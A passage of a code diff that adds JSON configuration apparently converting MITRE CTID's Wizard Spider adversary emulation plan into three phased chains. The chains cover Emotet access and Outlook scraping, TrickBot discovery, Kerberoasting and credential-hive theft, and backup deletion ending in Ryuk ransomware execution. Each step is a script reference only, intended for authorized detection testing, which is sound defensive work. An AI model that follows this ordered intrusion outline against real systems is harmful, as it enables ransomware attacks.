+            "script_ref": "CTID - Wizard Spider - T1486 - Wizard Spider Executes Ryuk Ransomware",
+            "source_step": "10.A.2-7"
+          },
+          {
+            "id": "procedure-038-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Domain Controller",
+            "source_step": "10.A.7"
+          }
+        ]
+      }
+    },
+    {
+      "name": "CTID - Wizard Spider - Phase 1 - Emotet Initial Access and Collection",
+      "description": "Wizard Spider uses Emotet for initial access, persistence, host discovery, Outlook collection, and movement toward the next host.",
+      "objective": "Validate detection and response across the documented Emotet portion of the Wizard Spider scenario.",
+      "author": "MITRE CTID / X3M.AI conversion",
+      "tags": [
+        "ctid",
+        "threat-informed",
+        "full-emulation",
+        "phase",
+        "adversary:wizard-spider"
+      ],
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan_type": "full-emulation",
+        "adversary": "Wizard Spider",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "scenario_id": "phase-1",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/wizard_spider/Operations_Flow/Operations_Flow.md",
+        "override_reason": "The CTID Wizard Spider Operations Flow explicitly groups source steps into three named phases. The YAML preserves step numbers but not phase objects, so this reviewed mapping creates bounded phase Chains without changing procedure order."
+      },
+      "plan_type": "full-emulation",
+      "adversary": "Wizard Spider",
+      "scenario_id": "phase-1",
+      "scenario_name": "Phase 1 - Emotet Initial Access and Collection",
+      "flow": {
+        "nodes": [
+          {
+            "id": "procedure-001-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Upload Agent Executable to Initial Target",
+            "source_step": "1.A.1"
+          },
+          {
+            "id": "procedure-002-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1078 - RDP Connection to Initial Target (Dorothy)",
+            "source_step": "1.A.1"
+          },
+          {
+            "id": "procedure-003-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1204.002 - Run Agent Executable for Initial Access",
+            "source_step": "1.A.1"
+          },
+          {
+            "id": "procedure-004-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1547.001 - Emotet Persistence",
+            "source_step": "2.A.1"
+          },
+          {
+            "id": "procedure-005-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1082 - Emotet System Info Discovery",
+            "source_step": "3.A.1"
+          },
+          {
+            "id": "procedure-006-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1057 - Emotet Process Discovery",
+            "source_step": "3.A.2"
+          },
+          {
+            "id": "procedure-007-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Emotet Download Outlook Scraper DLL",
+            "source_step": "3.A.3"
+          },
+          {
+            "id": "procedure-008-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1552 - Emotet Scrape Email Content From Outlook",
+            "source_step": "3.A.4"
+          },
+          {
+            "id": "procedure-009-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1114.001 - Emotet Scrape Email Addresses from Outlook",
+            "source_step": "3.A.5"
+          },
+          {
+            "id": "procedure-010-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Initial Target",
+            "source_step": "3.A.5"
+          }
+        ]
+      }
+    },
+    {
+      "name": "CTID - Wizard Spider - Phase 2 - TrickBot Discovery and Domain Access",
+      "description": "Wizard Spider uses TrickBot for lateral movement, extensive discovery, Kerberoasting, domain controller access, persistence, and domain mapping.",
+      "objective": "Validate cross-stage detection and response across the documented TrickBot portion of the Wizard Spider scenario.",
+      "author": "MITRE CTID / X3M.AI conversion",
+      "tags": [
+        "ctid",
+        "threat-informed",
+        "full-emulation",
+        "phase",
+        "adversary:wizard-spider"
+      ],
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan_type": "full-emulation",
+        "adversary": "Wizard Spider",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "scenario_id": "phase-2",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/wizard_spider/Operations_Flow/Operations_Flow.md",
+        "override_reason": "The CTID Wizard Spider Operations Flow explicitly groups source steps into three named phases. The YAML preserves step numbers but not phase objects, so this reviewed mapping creates bounded phase Chains without changing procedure order."
+      },
+      "plan_type": "full-emulation",
+      "adversary": "Wizard Spider",
+      "scenario_id": "phase-2",
+      "scenario_name": "Phase 2 - TrickBot Discovery and Domain Access",
+      "flow": {
+        "nodes": [
+          {
+            "id": "procedure-011-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Toto)",
+            "source_step": "4.A.1-2"
+          },
+          {
+            "id": "procedure-012-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Toto)",
+            "source_step": "4.A.3"
+          },
+          {
+            "id": "procedure-013-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery",
+            "source_step": "5.A.1"
+          },
+          {
+            "id": "procedure-014-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1007 - TrickBot System Service Discovery (systeminfo)",
+            "source_step": "5.A.2"
+          },
+          {
+            "id": "procedure-015-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1087.001 - TrickBot Local Account Discovery",
+            "source_step": "5.A.3"
+          },
+          {
+            "id": "procedure-016-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1087.002 - TrickBot Domain Account Discovery",
+            "source_step": "5.A.4"
+          },
+          {
+            "id": "procedure-017-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1016 - TrickBot System Network Configuration Discovery",
+            "source_step": "5.A.5"
+          },
+          {
+            "id": "procedure-018-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1049 - TrickBot System Network Connections Discovery",
+            "source_step": "5.A.6"
+          },
+          {
+            "id": "procedure-019-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery (net config)",
+            "source_step": "5.A.7"
+          },
+          {
+            "id": "procedure-020-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1482 - TrickBot Domain Trust Discovery",
+            "source_step": "5.A.8"
+          },
+          {
+            "id": "procedure-021-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1069 - TrickBot Permission Groups Discovery",
+            "source_step": "5.A.9"
+          },
+          {
+            "id": "procedure-022-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1558.003 - TrickBot Perform Kerberoasting",
+            "source_step": "6.A.1-2"
+          },
+          {
+            "id": "procedure-023-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Second Target (Toto)",
+            "source_step": "6.A.2"
+          },
+          {
+            "id": "procedure-024-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Prepare Tools for Ingress Tool Transfer (Wizard)",
+            "source_step": "7.A.1"
+          },
+          {
+            "id": "procedure-025-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Wizard)",
+            "source_step": "7.A.1-2"
+          },
+          {
+            "id": "procedure-026-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Wizard)",
+            "source_step": "7.A.3"
+          },
+          {
+            "id": "procedure-027-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1547.004 - Wizard Spider Registry Persistence",
+            "source_step": "7.A.4"
+          },
+          {
+            "id": "procedure-028-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1069.002 - Wizard Spider Domain Group Discovery",
+            "source_step": "7.A.5"
+          },
+          {
+            "id": "procedure-029-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1003.003 - Wizard Spider Create Volume Shadow Copy",
+            "source_step": "8.A.1"
+          },
+          {
+            "id": "procedure-030-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1003.003 - Wizard Spider Exfil Volume Shadow Copy",
+            "source_step": "8.A.1"
+          },
+          {
+            "id": "procedure-031-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1003.002 - Wizard Spider Save Registry Hive",
+            "source_step": "8.A.2"
+          }
+        ]
+      }
+    },
+    {
+      "name": "CTID - Wizard Spider - Phase 3 - Recovery Inhibition and Ryuk Impact",
+      "description": "Wizard Spider inhibits recovery by stopping backup services and deleting recovery material before the documented Ryuk ransomware impact stage.",
+      "objective": "Validate high-consequence controls and response for recovery inhibition and ransomware impact in an authorized lab.",
+      "author": "MITRE CTID / X3M.AI conversion",
+      "tags": [
+        "ctid",
+        "threat-informed",
+        "full-emulation",
+        "phase",
+        "adversary:wizard-spider"
+      ],
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan_type": "full-emulation",
+        "adversary": "Wizard Spider",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "scenario_id": "phase-3",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/wizard_spider/Operations_Flow/Operations_Flow.md",
+        "override_reason": "The CTID Wizard Spider Operations Flow explicitly groups source steps into three named phases. The YAML preserves step numbers but not phase objects, so this reviewed mapping creates bounded phase Chains without changing procedure order."
+      },
+      "plan_type": "full-emulation",
+      "adversary": "Wizard Spider",
+      "scenario_id": "phase-3",
+      "scenario_name": "Phase 3 - Recovery Inhibition and Ryuk Impact",
+      "flow": {
+        "nodes": [
+          {
+            "id": "procedure-032-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads kill.bat",
+            "source_step": "9.A.1"
+          },
+          {
+            "id": "procedure-033-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1489 - Wizard Spider Runs kill.bat",
+            "source_step": "9.A.2-3"
+          },
+          {
+            "id": "procedure-034-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads window.bat",
+            "source_step": "9.A.4"
+          },
+          {
+            "id": "procedure-035-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1490 - Wizard Spider Runs window.bat",
+            "source_step": "9.A.5"
+          },
+          {
+            "id": "procedure-036-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1105 - Wizard Spider Downloads ryuk.exe",
+            "source_step": "10.A.1"
+          },
+          {
+            "id": "procedure-037-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1486 - Wizard Spider Executes Ryuk Ransomware",
+            "source_step": "10.A.2-7"
+          },
+          {
+            "id": "procedure-038-1",
+            "type": "script",
+            "script_ref": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Domain Controller",
+            "source_step": "10.A.7"
+          }
+        ]
+      }
+    }
+  ]
+}
